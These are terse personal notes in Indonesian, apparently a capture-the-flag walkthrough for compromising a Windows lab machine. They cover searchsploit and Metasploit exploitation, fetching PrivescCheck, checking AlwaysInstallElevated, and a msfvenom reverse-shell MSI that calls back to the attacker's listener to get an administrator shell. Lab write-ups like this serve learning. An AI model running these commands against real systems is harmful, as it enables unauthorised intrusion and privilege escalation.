1. scan banyak port -> windows inimah
2. /Images ada dir listing -> buka aja -> ada foto anomali webp sendiri lainnya png jpg
3. cek source code -> disitu ada fetch ke port -> coba lakuin sama -> pake method put jadi burp aja
4. gausah la -> langsung ke root port itu aja -> nah ada tuh cari exploit nya di searchsploit
5. searchsploit nama webserver -> copy id nya -> searchsploit -m id
6. msfconsole -> cari lagi use aja -> set rhost ke domain, rport ke port server itu, lhost ip vpn -> run
7. shell -> ke /users/desktop -> cat aja pake type tapi -> type user.txt
8. di folder user -> tree /f -> biar enak nyari2 
9. ada tuh cred -> coba cek peCheck.ps1 -> python server -> curl ip:port/namafile -o namafile -> run
10. . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended 
11. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
12. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
13. msfvenom -p windows/x64/shell_reverse_tcp LHOST=ipvpn LPORT=portnc -a x64 --platform Windows -f msi -o rev.msi 
14. python server -> curl kayak tadi -> nyalain nc port nya di msfvenom tadi ->  ./namafile.msi
15. ke /users/Administrator -> klaim root
